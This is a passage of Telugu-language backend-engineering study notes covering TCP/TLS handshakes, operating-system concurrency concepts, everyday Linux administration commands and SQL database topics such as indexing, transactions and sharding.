కంప్యూటర్లు ఒకదానితో ఒకటి మాట్లాడుకునేటప్పుడు బ్యాక్‌గ్రౌండ్‌లో జరిగే మైక్రో-స్టెప్స్ ఇవి.

### 🤝 TCP Handshake (3-Way Handshake)

- **What it is:** TCP కనెక్షన్ ఏర్పడే ప్రక్రియ:

1. **SYN (Synchronize):** క్లయింట్ -> సర్వర్ ("నేను కనెక్ట్ అవ్వచ్చా?")
2. **SYN-ACK:** సర్వర్ -> క్లయింట్ ("ఆ అవ్వచ్చు, ఇదిగో నా సిగ్నల్")
3. **ACK (Acknowledge):** క్లయింట్ -> సర్వర్ ("ఓకే, నేను డేటా పంపుతున్నా")

- **Why we care:** ప్రతి రిక్వెస్ట్‌కి ఇలా 3 సార్లు మాట్లాడుకోవడం వల్ల టైమ్ వేస్ట్ అవుతుంది.

### 🔒 SSL/TLS Handshake

- **What it is:** TCP హ్యాండ్‌షేక్ అయిపోయాక, HTTPS సెక్యూరిటీ కోసం జరిగే సంభాషణ. సర్వర్ తన డిజిటల్ సర్టిఫికెట్ (Public Key) ని ఇస్తుంది, క్లయింట్ దాన్ని వెరిఫై చేసి, ఇద్దరి మధ్య డేటా ఏ కీతో ఎన్‌క్రిప్ట్ అవ్వాలో (Symmetric Key) డిసైడ్ చేసుకుంటారు.

### ⏱️ TCP Keep-Alive

- **What it is:** ఒకసారి కనెక్షన్ అయ్యాక, ప్రతి రిక్వెస్ట్ కి మళ్ళీ మళ్ళీ హ్యాండ్‌షేక్ చేయకుండా, కనెక్షన్‌ని అలాగే ఓపెన్ ఉంచడం.
- **Why we need it:** ఇది నెట్‌వర్క్ ఓవర్‌హెడ్‌ని బాగా తగ్గిస్తుంది.

### 🏊 Connection Pooling (The Optimization King)

- **What it is:** మీ Node.js బ్యాకెండ్ నుండి Database (SQL) కి ప్రతిసారీ కొత్త కనెక్షన్ ఓపెన్ చేసి, క్లోజ్ చేయాలంటే చాలా టైమ్ పడుతుంది (CPU/Memory వేస్ట్). అందుకే బ్యాకెండ్ స్టార్ట్ అయినప్పుడే ఒక 10-20 కనెక్షన్లను ఓపెన్ చేసి ఒక 'పూల్' (Pool) లాగా ఉంచుతాం. ఏ రిక్వెస్ట్ వచ్చినా ఆ పూల్ లోని ఒక కనెక్షన్ వాడుకుని, పని కాగానే మళ్ళీ పూల్ లో పెట్టేస్తుంది.
- **Why it's a lifesaver:** ఇది డేటాబేస్ పెర్ఫార్మెన్స్‌ని విపరీతంగా పెంచుతుంది.

---

## 3. Operating System Basics

---

ఆపరేటింగ్ సిస్టమ్ (OS) బేసిక్స్ అనేవి బ్యాకెండ్ ఇంజనీరింగ్‌కి పునాది లాంటివి. మనం రాసే కోడ్ (Node.js, Java, or Python) బ్యాక్‌గ్రౌండ్‌లో కంప్యూటర్ మెమరీని, ప్రొసెసర్‌ని ఎలా వాడుకుంటుంది అనేది ఈ కాన్సెప్ట్స్ ద్వారానే తెలుస్తుంది.

వీటిని కూడా మన స్టైల్ లో—అవి ఏంటి, ఎందుకు వాడతాం, ఒకదాని నుండి ఇంకొకదానికి ఎందుకు అప్‌గ్రేడ్ అయ్యాం అనే కోణంలో తెలుగులో క్లియర్‌గా చూద్దాం.

---

## 1. Execution Units (The Workers)

కంప్యూటర్‌లో కోడ్ రన్ అవ్వడానికి వాడే బేసిక్ బిల్డింగ్ బ్లాక్స్ ఇవి.

### 🏭 Processes

- **What it is:** రన్ అవుతున్న ఒక ప్రోగ్రామ్‌ని **Process** అంటారు (ఉదా: మీ Node.js సర్వర్ లేదా VS Code). ప్రతి ప్రొసెస్‌కి OS విడిగా మెమరీ (RAM) కేటాయిస్తుంది. ఒక ప్రొసెస్ మెమరీని ఇంకో ప్రొసెస్ నేరుగా ముట్టుకోలేదు.
- **Why we upgraded:** ఇవి చాలా హెవీ (Resource Heavy). ఒక కొత్త ప్రొసెస్ క్రియేట్ చేయాలన్నా, దాన్ని డిలీట్ చేయాలన్నా OS కి చాలా టైమ్, మెమరీ పడుతుంది. రెండు ప్రొసెస్ ల మధ్య డేటా షేర్ చేసుకోవడం (IPC) చాలా కాంప్లెక్స్.

### 🧵 Threads (The Micro-Workers)

- **What it is:** ఒక ప్రొసెస్ లోపల ఉండే చిన్న వర్కర్స్ లేదా సబ్-టాస్క్‌లని **Threads** అంటారు. ఒకే ప్రొసెస్ కి చెందిన మల్టిపుల్ థ్రెడ్స్ అన్నీ అదే ప్రొసెస్ యొక్క మెమరీని షేర్ చేసుకుంటాయి.
- **Why it's better:** ఇవి చాలా లైట్ వెయిట్. కొత్త థ్రెడ్ క్రియేట్ చేయడం ఈజీ, మెమరీ షేరింగ్ చాలా ఫాస్ట్.
- **The Catch:** అందరూ ఒకే మెమరీ రూమ్‌లో ఉంటారు కాబట్టి, ఒక థ్రెడ్ చేసే తప్పు వల్ల (Memory Leak) మొత్తం ప్రొసెస్ క్రాష్ అయిపోయే ఛాన్స్ ఉంది.

### 🔄 Context Switching

- **What it is:** మీ కంప్యూటర్‌లో 4 CPU కోర్స్ మాత్రమే ఉండి, వందల థ్రెడ్స్ రన్ అవుతుంటే, CPU ఒక థ్రెడ్ నుండి ఇంకో థ్రెడ్‌కి చాలా వేగంగా మారుతూ ఉంటుంది (Switch అవుతుంది). దీనివల్ల అన్నీ ఒకేసారి రన్ అవుతున్నట్లు అనిపిస్తుంది.
- **The Downside:** కంటెక్స్ట్ స్విచ్చింగ్ ఉచితంగా రాదు. ఒక థ్రెడ్ పని ఆపి, ఇంకో థ్రెడ్ పని మొదలుపెట్టేటప్పుడు పాత థ్రెడ్ స్టేటస్ ని దాచడం, కొత్త థ్రెడ్ స్టేటస్ ని లోడ్ చేయడానికి CPU టైమ్ వేస్ట్ అవుతుంది (Overhead). సిస్టమ్ డిజైన్‌లో కంటెక్స్ట్ స్విచ్చింగ్ వీలైనంత తక్కువ ఉండేలా చూసుకోవాలి.

---

## 2. Resource & Workload Classification

### 🧠 CPU Bound vs I/O Bound Tasks

- **CPU Bound Tasks:** ఏ టాస్క్ అయితే పూర్తిగా CPU పవర్ (గణిత లెక్కలు, ఎన్‌క్రిప్షన్, ఇమేజ్ ప్రాసెసింగ్) పై ఆధారపడి ఉంటుందో అది CPU Bound.
- **I/O Bound Tasks:** ఏ టాస్క్ అయితే నెట్‌వర్క్ కాల్స్, డేటాబేస్ క్వెరీలు, లేదా ఫైల్ రీడ్/రైట్ కోసం వెయిట్ చేస్తుందో అది I/O Bound.
- **Backend Strategy:** Node.js అనేది సింగిల్-థ్రెడెడ్ అవ్వడం వల్ల **I/O Bound** టాస్క్‌లకి అద్భుతంగా పనిచేస్తుంది (ఎందుకంటే వెయిటింగ్ టైమ్‌లో థ్రెడ్‌ని వృధా చేయదు). కానీ **CPU Bound** టాస్క్‌లు వస్తే Node.js సర్వర్ జామ్ అయిపోతుంది. అలాంటి చోట మల్టీ-థ్రెడెడ్ లాంగ్వేజెస్ (Java, Go, C++) వాడతాం.

### 📅 Scheduling

- **What it is:** వందల టాస్క్‌లు క్యూలో ఉన్నప్పుడు, ఏ ప్రొసెస్ లేదా థ్రెడ్‌కి ముందుగా CPU అవకాశం ఇవ్వాలి అని OS డిసైడ్ చేసే అల్గారిథమ్స్ (ఉదా: Round Robin, First-Come-First-Served, Priority Scheduling).

---

## 3. Memory & Storage Architecture

### 🧠 Memory Management & Virtual Memory

- **What it is:** మీ కంప్యూటర్‌లో 8GB RAM ఉందనుకుందాం, కానీ మీరు 16GB సైజ్ ఉన్న ఒక గేమ్ లేదా సాఫ్ట్‌వేర్ రన్ చేయాలి. అప్పుడు OS **Virtual Memory** కాన్సెప్ట్‌ని వాడుతుంది.
- **How it works:** మీ హార్డ్ డిస్క్ (SSD) లో కొంత స్పేస్‌ని తీసుకుని దాన్ని RAM లాగా భ్రమింపజేస్తుంది (Paging/Swapping). నిజానికి RAM లో పట్టని డేటాని హార్డ్ డిస్క్‌లోకి నెట్టేస్తుంది.
- **Why it matters for Backend:** మీ సర్వర్‌లో మెమరీ లీక్ అయి, వర్చువల్ మెమరీ (Disk) లోకి డేటా వెళ్ళడం స్టార్ట్ అయితే, హార్డ్ డిస్క్ RAM కంటే చాలా స్లో కాబట్టి మీ బ్యాకెండ్ సర్వర్ పడకchoose (Extremely Slow) అవుతుంది.

### 📂 File System

- **What it is:** హార్డ్ డిస్క్‌లో డేటా ఎలా స్టోర్ అవ్వాలి, ఎలా రీడ్ అవ్వాలి (NTFS, ext4) అని చెప్పేది. బ్యాకెండ్‌లో లాగ్స్ (Logs) రాయడానికి, యూజర్ అప్‌లోడ్ చేసే ఫైల్స్ మేనేజ్ చేయడానికి దీని గురించిన అవగాహన ముఖ్యం.

---

## 4. Concurrency & Synchronization (The Traffic Police)

మల్టిపుల్ థ్రెడ్స్ ఒకే మెమరీ లేదా వేరియబుల్‌ని ఒకేసారి మార్చడానికి ట్రై చేసినప్పుడు **Race Condition** వస్తుంది (ఉదాహరణకు: బ్యాంక్ బ్యాలెన్స్ ₹100 ఉంటే, ఇద్దరు ఒకే మిల్లీసెకండ్‌లో ₹50 విత్‌డ్రా చేస్తే ప్రాబ్లం అవుతుంది). దీన్ని ఆపడానికే ఈ కింది టూల్స్ వాడతాం.

### 🔒 Locks & Mutex (Mutual Exclusion)

- **What it is:** ఒక రూమ్‌కి ఒకే తాళంచెవి (Key) ఉన్నట్లు. ఒక థ్రెడ్ ఒక వేరియబుల్‌ని వాడుతున్నప్పుడు దానికి లాక్ (Mutex) వేసుకుంటుంది. ఆ పని పూర్తయ్యే వరకు వేరే ఏ థ్రెడ్ దాన్ని ముట్టుకోలేదు. పని అయ్యాక తాళం తీస్తుంది (Unlock).

### 🚦 Semaphores

- **What it is:** ఇది ముటెక్స్ లాంటిదే కానీ, దీనికి ఒక కౌంటర్ (Counter) ఉంటుంది. ఉదాహరణకు ఒక రెస్టారెంట్‌లో 5 సీట్లు ఉంటే, 5 గురిని అనుమతిస్తుంది. 6వ వాడు క్యూలో నిలబడాలి. ఒకరు బయటకి వస్తే (Signal), ఇంకొకరు లోపలికి వెళ్ళవచ్చు (Wait).
- **Why we upgraded from Mutex to Semaphore:** ముటెక్స్ అనేది కేవలం ఒకే ఒక్క థ్రెడ్ ని అనుమతించడానికి (Binary - 0 or 1). కానీ ఒక రిసోర్స్ ని ఒకేసారి 3 లేదా 4 థ్రెడ్స్ వాడుకోవచ్చు అనుకున్నప్పుడు సెమాఫోర్ వాడతాం.

### ☠️ Deadlocks

- **What it is:** ఇదొక ప్రమాదకరమైన పరిస్థితి. థ్రెడ్-A దగ్గర లాక్-1 ఉంది, దానికి లాక్-2 కావాలి. థ్రెడ్-B దగ్గర లాక్-2 ఉంది, దానికి లాక్-1 కావాలి. ఇద్దరూ ఒకరి కోసం ఒకరు ఎదురుచూస్తూ జీవితాంతం అలానే ఆగిపోతారు. దీన్నే **Deadlock** అంటారు. బ్యాకెండ్ కోడ్ రాసేటప్పుడు లాక్స్ ని కరెక్ట్ ఆర్డర్ లో వాడకపోతే ఈ సమస్య వస్తుంది.

---

## 5. OS Communication

### 🚨 Signals

- **What it is:** OS ఒక రన్ అవుతున్న ప్రొసెస్‌కి పంపే చిన్న నోటిఫికేషన్ లేదా అలర్ట్.
- **Why it matters in Backend:** మీరు మీ Node.js సర్వర్‌ని ఆపేటప్పుడు (Ctrl+C కొట్టినప్పుడు) OS దానికి **`SIGINT`** లేదా **`SIGTERM`** అనే సిగ్నల్ పంపుతుంది. మన కోడ్‌లో ఈ సిగ్నల్స్ ని క్యాచ్ చేసి, డేటాబేస్ కనెక్షన్స్ ని క్లోజ్ చేసి, సర్వర్ ని స్మూత్ గా ఆపవచ్చు (Graceful Shutdown).

---

## 4. Linux

---

లినుక్స్ (Linux) అనేది ప్రపంచంలోని 90% పైగా బ్యాకెండ్ సర్వర్లు రన్ అయ్యే ఆపరేటింగ్ సిస్టమ్. మీరు రాసిన కోడ్ AWS, Azure లేదా Docker కంటైనర్‌లో రన్ అవ్వాలన్నా, సర్వర్ లాగ్స్ చెక్ చేయాలన్నా లినుక్స్ కమాండ్స్ పై పట్టు ఉండటం ఒక బ్యాకెండ్ డెవలపర్‌కి అత్యంత ముఖ్యం.

దీన్ని కూడా మనం మునుపటి లాగే క్లియర్‌గా, తెలుగులో నేర్చుకుందాం.

---

## 1. Structure & Access Control

### 📂 File System

- **What it is:** విండోస్ (Windows) లో లాగా `C:`, `D:` డ్రైవ్‌లు లినుక్స్‌లో ఉండవు. ఇక్కడ అంతా ఒకే ఒక రూట్ డైరెక్టరీ **`/`** (Root) నుండి స్టార్ట్ అవుతుంది.
- **Key Folders:** \* `/etc`: కాన్ఫిగరేషన్ ఫైల్స్ (Nginx, Database సెట్టింగ్స్) ఇక్కడే ఉంటాయి.
- `/var/log`: అప్లికేషన్ మరియు సిస్టమ్ లాగ్స్ ఇక్కడ స్టోర్ అవుతాయి.
- `/home`: యూజర్ల పర్సనల్ ఫోల్డర్స్.

### 🔐 Permissions

- **What it is:** లినుక్స్‌లో ప్రతి ఫైల్/ఫోల్డర్‌కి ముగ్గురు వ్యక్తుల పర్మిషన్స్ ఉంటాయి: **Read (r)**, **Write (w)**, **Execute (x)**. ఇవి **User (u)**, **Group (g)**, **Others (o)** కి వర్తిస్తాయి.
- **Why it matters:** ఒక హ్యాకర్ మీ సర్వర్‌లోకి వస్తే, మీ కాన్ఫిగరేషన్ ఫైల్స్ చదవకుండా లేదా మార్చకుండా ఉండటానికి సరైన పర్మిషన్స్ (`chmod`, `chown` కమాండ్స్ ఉపయోగించి) సెట్ చేయడం ముఖ్యం. (ఉదా: `chmod 755` లేదా `chmod 400`).

---

## 2. Interaction Layer (The Terminal)

### 🐚 Shell vs Bash

- **Shell:** ఇది యూజర్‌కి, లినుక్స్ కెర్నల్ (Kernel) కి మధ్య ఉండే ఒక ఇంటర్‌ఫేస్. మనం ఇచ్చే కమాండ్స్‌ని ఇది అర్థం చేసుకుని OS కి చెప్తుంది.
- **Bash (Bourne Again Shell):** ఇది అత్యంత పాపులర్ మరియు మోస్ట్ కామన్ షెల్. చాలా లినుక్స్ డిస్ట్రిబ్యూషన్స్‌లో (Ubuntu, CentOS) ఇది బై-డిఫాల్ట్ వస్తుంది.
- **Why we upgrade (Shell to Scripting):** టెర్మినల్‌లో ఒకే కమాండ్ ని మళ్ళీ మళ్ళీ టైప్ చేయడానికి బదులు, అన్ని కమాండ్స్‌ని ఒక ఫైల్‌లో రాసి రన్ చేయడాన్నే **Bash Scripting** అంటారు. సర్వర్ డెప్లాయ్‌మెంట్స్ ఆటోమేట్ చేయడానికి ఇది వాడతాం.

---

## 3. Operations & Observability (Monitoring the Server)

### 🏭 Process Commands

- **What it is:** మీ సర్వర్‌లో ఏ బ్యాకెండ్ అప్లికేషన్ ఎంత RAM, CPU వాడుతుందో చూడటానికి మరియు కంట్రోల్ చేయడానికి వాడే కమాండ్స్.
- **Key Commands:**
- `ps aux` లేదా `top` / `htop`: రన్ అవుతున్న అన్ని ప్రొసెస్‌లను మరియు వాటి రిసోర్స్ వాడకాన్ని లైవ్‌లో చూపిస్తుంది.
- `kill -9 <PID>`: సరిగ్గా రెస్పాండ్ అవ్వకుండా సర్వర్‌ని హ్యాంగ్ చేస్తున్న ప్రొసెస్‌ని ఫోర్స్‌ఫుల్‌గా ఆపేయడానికి (Kill చేయడానికి) వాడుతాం.

### 🌐 Networking Commands

- **What it is:** సర్వర్ నెట్‌వర్క్ ఇష్యూస్ ని ఫిక్స్ చేయడానికి వాడే టూల్స్.
- **Key Commands:**
- `ping`: అవతలి సర్వర్ బతికే ఉందా లేదా అని చెక్ చేయడానికి.
- `curl` / `wget`: టెర్మినల్ నుండి ఏవైనా APIలను టెస్ట్ చేయడానికి లేదా ఫైల్స్ డౌన్‌లోడ్ చేయడానికి.
- `netstat` లేదా `ss`: మీ Node.js యాప్ రన్ అవుతున్న పోర్ట్ (ఉదా: `3000`) ఆల్రెడీ వేరే యాప్ వాడుతుందా అని చెక్ చేయడానికి (`ss -tuln`).

### 📝 Logs

- **What it is:** సర్వర్ లేదా అప్లికేషన్ బ్యాక్‌గ్రౌండ్‌లో ఏం చేస్తుందో రాసి ఉంచే డైరీ.
- **The Lifesaver:** `tail -f /var/log/nginx/error.log` — ఈ కమాండ్ సర్వర్‌లో వచ్చే ఎర్రర్స్‌ని లైవ్‌గా స్క్రీన్ పై చూపిస్తుంది. ప్రొడక్షన్ లో బగ్స్ ని డీబగ్ చేయడానికి ఇది బెస్ట్ టూల్.

---

## 4. Background Services & Automation

### ⏰ Cron Jobs

- **What it is:** ఒక నిర్దిష్ట సమయంలో ఒక పనిని ఆటోమేటిక్‌గా రన్ చేసే టైమ్-బేస్డ్ షెడ్యూలర్.
- **Real-World Example:** ప్రతిరోజూ రాత్రి 2 గంటలకి డేటాబేస్ బ్యాకప్ తీసి AWS S3 లో వేయాలి, లేదా ప్రతి ఆదివారం యూజర్లకి వీక్లీ రిపోర్ట్ ఈమెయిల్ పంపాలి అనుకుంటే `Crontab` లో స్క్రిప్ట్ సెట్ చేస్తే చాలు, సిస్టమ్ చూసుకుంటుంది.

### ⚙️ Systemd

- **What it is:** లినుక్స్ స్టార్ట్ అవ్వగానే బ్యాక్‌గ్రౌండ్‌లో సర్వీసెస్‌ని (Nginx, Database) మేనేజ్ చేసే మెయిన్ మేనేజర్.
- **Why we use it:** మీరు మీ Node.js యాప్‌ని `node server.js` అని రన్ చేస్తే, టెర్మినల్ క్లోజ్ చేయగానే యాప్ ఆగిపోతుంది. అలా కాకుండా మీ యాప్ బ్యాక్‌గ్రౌండ్‌లో నిరంతరాయంగా రన్ అవ్వాలన్నా, ఒకవేళ సర్వర్ క్రాష్ అయితే ఆటోమేటిక్‌గా రీస్టార్ట్ అవ్వాలన్నా దాన్ని ఒక **Systemd Service** లాగా క్రియేట్ చేయాలి (`systemctl start myservice`).

---

## 5. Remote Access & File Transfer

### 🔑 SSH (Secure Shell)

- **What it is:** మీ ఇంట్లో కూర్చుని, ప్రపంచంలో ఎక్కడో (ఉదా: AWS US-East రీజియన్ లో) ఉన్న లినుక్స్ సర్వర్‌ని సురక్షితంగా, ఎన్‌క్రిప్టెడ్ పద్ధతిలో కనెక్ట్ అవ్వడానికి వాడే ప్రోటోకాల్. (`ssh username@server_ip`).

### 📦 SCP vs rsync

- **SCP (Secure Copy):** SSH కనెక్షన్ వాడుకుని మీ లోకల్ కంప్యూటర్ నుండి సర్వర్‌కి ఫైల్స్ కాపీ చేయడానికి వాడే సింపుల్ కమాండ్.
- **Why we upgraded to rsync:** SCP ప్రతిసారీ మొత్తం ఫైల్‌ని మళ్ళీ కాపీ చేస్తుంది. కానీ **rsync (Remote Sync)** చాలా స్మార్ట్. ఇది కేవలం మారిన డేటాను (Delta Changes) మాత్రమే ఐడెంటిఫై చేసి సింక్ చేస్తుంది. ఒకవేళ మధ్యలో ఇంటర్నెట్ కట్ అయినా, ఎక్కడ ఆగిందో అక్కడి నుండే మళ్ళీ స్టార్ట్ అవుతుంది (Resumable). అందుకే సర్వర్ బ్యాకప్స్ మరియు డెప్లాయ్‌మెంట్స్ కి `rsync` బెస్ట్ ఛాయిస్.

---

# 2: Databases

## SQL

---

డేటాబేస్ (Database) అనేది బ్యాకెండ్ సిస్టమ్ డిజైన్‌లో అత్యంత కీలకమైన భాగం. మన అప్లికేషన్ యొక్క మొత్తం డేటా ఇక్కడే భద్రంగా ఉంటుంది. రిలేషనల్ డేటాబేస్‌లైన **PostgreSQL**, **MySQL** లు డేటాను ఎలా స్టోర్ చేస్తాయి, వాటిని వేగంగా ఎలా వెతకాలి, మరియు పెద్ద మొత్తంలో డేటా వచ్చినప్పుడు ఎలా మేనేజ్ చేయాలి అనేది ఈ టాపిక్స్ ద్వారా క్లియర్‌గా, తెలుగులో నేర్చుకుందాం.

---

## 1. Relational Database & Structure (The Foundation)

### 📊 SQL, MySQL & PostgreSQL

- **SQL (Structured Query Language):** ఇది డేటాబేస్‌తో మాట్లాడటానికి వాడే కామన్ లాంగ్వేజ్.
- **MySQL vs PostgreSQL:** రెండు పాపులర్ ఓపెన్ సోర్స్ రిలేషనల్ డేటాబేస్‌లే. అయితే MySQL సింపుల్ అప్లికేషన్స్ కి చాలా స్పీడ్‌గా పనిచేస్తుంది. కానీ **PostgreSQL** అనేది చాలా అడ్వాన్స్‌డ్. ఇది కాంప్లెక్స్ క్వెరీలు, JSON డేటా టైప్స్ మరియు ఎంటర్‌ప్రైజ్ లెవెల్ ఫీచర్స్ కి అద్భుతంగా సపోర్ట్ చేస్తుంది.

### 🗂️ Tables, Constraints & Keys

- **Tables:** డేటాను రోస్ (Rows) మరియు కాలమ్స్ (Columns) రూపంలో స్టోర్ చేసే నిర్మాణం.
- **Constraints:** డేటా తప్పుగా ఎంటర్ అవ్వకుండా పెట్టే రూల్స్ (ఉదా: `NOT NULL`, `UNIQUE`).
- **Primary Key:** టేబుల్‌లో ప్రతి రో ని విడిగా ఐడెంటిఫై చేసే యూనిక్ ఐడి (ఉదా: `user_id`).
- **Foreign Key:** రెండు టేబుల్స్ మధ్య రిలేషన్ పెట్టడానికి వాడేది. (ఉదా: `orders` టేబుల్‌లో ఏ యూజర్ కొన్నాడో చెప్పే `user_id`).

---

## 2. Speed Optimization: Indexes (The Book Index)

డేటాబేస్‌లో లక్షల రికార్డులు ఉన్నప్పుడు వెతకడం స్లో అవుతుంది. దాన్ని ఫాస్ట్ చేయడానికి ఇండెక్సెస్ వాడతాం.

### 📖 Indexes, Composite & Covering Index

- **Basic Index (B-Tree):** ఒక పెద్ద పుస్తకంలో వెనుక ఉండే ఇండెక్స్ పేజీ లాంటిది. ఇండెక్స్ లేకపోతే డేటాబేస్ ప్రతి పేజీని వెతకాలి (**Full Table Scan**). ఇండెక్స్ ఉంటే డైరెక్ట్‌గా ఆ లొకేషన్‌కి వెళ్తుంది.
- **Composite Index:** ఒకటి కంటే ఎక్కువ కాలమ్స్ కలిపి ఇండెక్స్ క్రియేట్ చేయడం. (ఉదా: `WHERE first_name = 'X' AND last_name = 'Y'`). ఇందులో కాలమ్స్ ఆర్డర్ చాలా ముఖ్యం.
- **Covering Index (The Upgrade):** సాధారణంగా ఇండెక్స్ చూశాక, అసలు డేటా కోసం డేటాబేస్ మళ్ళీ మెయిన్ టేబుల్ ని రీడ్ చేయాలి. కానీ మీరు అడిగిన డేటా అంతా ఇండెక్స్‌లోనే ఉంటే (ఉదా: ఇండెక్స్ లోనే ఈమెయిల్ కూడా ఉంటే), మెయిన్ టేబుల్‌కి వెళ్లకుండా ఇండెక్స్ నుండే డేటా ఇచ్చేస్తుంది. ఇది క్వెరీని సూపర్ ఫాస్ట్ చేస్తుంది.

### 🔍 Query Optimization & EXPLAIN ANALYZE

- **What it is:** మీ SQL క్వెరీ ఎందుకు స్లోగా రన్ అవుతుందో తెలుసుకోవడానికి క్వెరీ ముందు `EXPLAIN ANALYZE` అని పెట్టి రన్ చేయాలి.
- **Why it's a lifesaver:** ఇది డేటాబేస్ బ్యాక్‌గ్రౌండ్‌లో క్వెరీని ఎలా ఎగ్జిక్యూట్ చేసిందో, ఎక్కడ ఇండెక్స్ వాడింది, ఎక్కడ ఫుల్ టేబుల్ స్కాన్ చేసిందో ఒక ప్లాన్ (Execution Plan) రూపంలో చూపిస్తుంది. దాన్ని బట్టి మనం క్వెరీని ఆప్టిమైజ్ చేయవచ్చు.

---

## 3. Data Representation: Views

### 🖼️ Views vs Materialized Views

- **Views:** ఇది ఒక వర్చువల్ టేబుల్. పెద్ద కాంప్లెక్స్ క్వెరీని ఒక పేరుతో దాచి ఉంచడం. మీరు వ్యూ ని కాల్ చేసిన ప్రతిసారీ బ్యాక్‌గ్రౌండ్‌లో ఆ ఒరిజినల్ క్వెరీ మళ్ళీ రన్ అవుతుంది.
- **Why we upgraded to Materialized Views:** వ్యూస్ వల్ల కోడ్ సింప్లిఫై అవుతుంది కానీ స్పీడ్ పెరగదు. అందుకే **Materialized Views** వచ్చాయి. ఇవి క్వెరీ రన్ చేసి వచ్చిన రిజల్ట్‌ని నిజంగా డిస్క్‌లో స్టోర్ చేసి ఉంచుతాయి. డేటా ఆల్రెడీ రెడీగా ఉంటుంది కాబట్టి రిపోర్ట్స్ చాలా ఫాస్ట్‌గా లోడ్ అవుతాయి. (కానీ మెయిన్ టేబుల్ మారినప్పుడు దీన్ని `REFRESH` చేయాల్సి ఉంటుంది).

---

## 4. Reliability & Concurrency: Transactions (ACID)

ఒకేసారి వందల మంది డేటాను మారుస్తున్నప్పుడు డేటా తప్పు అవ్వకుండా ఉండేందుకు ఇవి వాడతాం.

### 🧱 ACID Properties

ఏ డేటాబేస్ ట్రాన్సాక్షన్ అయినా పక్కాగా జరగడానికి ఈ 4 రూల్స్ పాటించాలి:

1. **Atomicity (అంతా లేదా ఏమీ లేదు):** ఒక ట్రాన్సాక్షన్‌లో 3 స్టెప్స్ ఉంటే, మూడు జరగాలి, లేదా ఏ ఒక్కటి ఫెయిల్ అయినా మొత్తం క్యాన్సిల్ (Rollback) అవ్వాలి. (ఉదా: మీ అకౌంట్ నుండి డబ్బులు కట్ అయి, అవతలి వాడికి క్రెడిట్ అవ్వకపోతే కుదరదు).
2. **Consistency:** రూల్స్ అన్నీ పాటిస్తూ డేటాబేస్ ఎప్పుడూ వాలిడ్ స్టేట్ లోనే ఉండాలి.
3. **Isolation:** ఒక ట్రాన్సాక్షన్ జరుగుతున్నప్పుడు, పక్కన జరిగే ఇంకో ట్రాన్సాక్షన్ దీనితో జోక్యం చేసుకోకూడదు.
4. **Durability:** ఒకసారి ట్రాన్సాక్షన్ సక్సెస్ (Commit) అయ్యాక, కరెంట్ పోయినా సర్వర్ క్రాష్ అయినా ఆ డేటా పోకూడదు.

### 🎭 Isolation Levels

ఒకే డేటాబేస్ రికార్డ్‌ని ఇద్దరు ఒకేసారి చదువుతూ/మారుస్తున్నప్పుడు ఏ లెవెల్ వరకు ఐసోలేషన్ ఉండాలో డిసైడ్ చేసే సెట్టింగ్స్.

- **Read Uncommitted:** ఒకరు మారుస్తున్న (కానీ ఇంకా సేవ్ చేయని) డేటాని ఇంకొకరు చూడొచ్చు (**Dirty Read**). ఇది సేఫ్ కాదు.
- **Read Committed:** సేవ్ (Commit) చేసిన డేటాని మాత్రమే అవతలి వాళ్ళు చూడగలరు. (MySQL/Postgres లో ఇది కామన్).
- **Repeatable Read:** ఒక ట్రాన్సాక్షన్ నడుస్తున్నంత సేపు ఒకే రికార్డ్ ని ఎన్నిసార్లు చదివినా ఒకే డేటా కనిపిస్తుంది, మధ్యలో వేరే వాళ్ళు మార్చినా సరే.
- **Serializable:** అత్యంత స్ట్రిక్ట్ లెవెల్. ఒకదాని తర్వాత ఒకటి మాత్రమే జరుగుతాయి (Parallel గా జరగవు). స్లోగా ఉంటుంది కానీ పక్కా సెక్యూర్.

### 🔒 Locks & Deadlocks

- **Locks:** ఒక రో ని అప్‌డేట్ చేస్తున్నప్పుడు వేరే వాళ్ళు మార్చకుండా డేటాబేస్ దానికి తాళం (Lock) వేస్తుంది.
- **Deadlocks:** OS లో లాగే, ట్రాన్సాక్షన్-1 కి రో-A దగ్గర లాక్ ఉంది, దానికి రో-B కావాలి. ట్రాన్సాక్షన్-2 కి రో-B దగ్గర లాక్ ఉంది, దానికి రో-A కావాలి. ఇద్దరూ ఆగిపోతారు. డేటాబేస్ దీన్ని గుర్తించి ఒక ట్రాన్సాక్షన్‌ని ఫోర్స్‌ఫుల్ గా ఫెయిల్ చేస్తుంది.

---

## 5. Scaling Large Databases (పెద్ద మొత్తంలో డేటాని హ్యాండిల్ చేయడం)

మీ వెబ్‌సైట్ కి కోట్లాది మంది యూజర్లు వచ్చినప్పుడు డేటాబేస్‌ని ఎలా స్కేల్ చేయాలి?

### 👥 Replication (Master-Slave Architecture)

- **What it is:** ఒకే ఒక మెయిన్ డేటాబేస్ (Master) ఉంచి, దానికి కాపీలుగా ఇంకొన్ని డేటాబేస్‌లను (Slaves/Replicas) పెట్టడం.
- **Why it's used:** అప్లికేషన్స్ లో 80% కేవలం డేటాని చదవడం (`GET` Requests) ఉంటుంది. కాబట్టి రైట్ ఆపరేషన్స్ (`POST/PUT`) అన్నీ మాస్టర్ లో జరుగుతాయి, రీడ్ ఆపరేషన్స్ అన్నీ స్లేవ్స్ నుండి జరుగుతాయి. దీనివల్ల లోడ్ తగ్గుతుంది.

### ✂️ Partitioning vs Sharding

- **Partitioning (Horizontal/Vertical):** ఇది ఒకే డేటాబేస్ లోపల జరుగుతుంది. ఉదాహరణకు ఒకే `orders` టేబుల్‌లో 10 ఏళ్ళ డేటా ఉంటే, దాన్ని ఇయర్ వైజ్ (`orders_2024`, `orders_2025`) విడగొట్టడం. డేటాబేస్ ఇంజన్ కి ఏ ఇయర్ డేటా కావాలో ఆ పార్టిషన్ మాత్రమే వెతుకుతుంది.
- **Sharding (The Ultimate Upgrade):** మీ డేటా ఒకే కంప్యూటర్ హార్డ్ డిస్క్‌లో పట్టనంత పెద్దదైనప్పుడు, డేటాని ముక్కలు చేసి వేర్వేరు ఫిజికల్ సర్వర్లలో పెట్టడాన్ని **Sharding** అంటారు. (ఉదాహరణకు: A-M అక్షరాలతో ఉన్న యూజర్ల డేటా సర్వర్-1 లో, N-Z యూజర్ల డేటా సర్వర్-2 లో ఉంటుంది).

---

## 6. Logic Inside Database

### 💾 Stored Procedures

- **What it is:** అప్లికేషన్ కోడ్ (Node.js) లో SQL రాయడానికి బదులు, పెద్ద కాంప్లెక్స్ లాజిక్‌ని డేటాబేస్ లోపలే ఒక ఫంక్షన్ లాగా రాసి దాచడం.
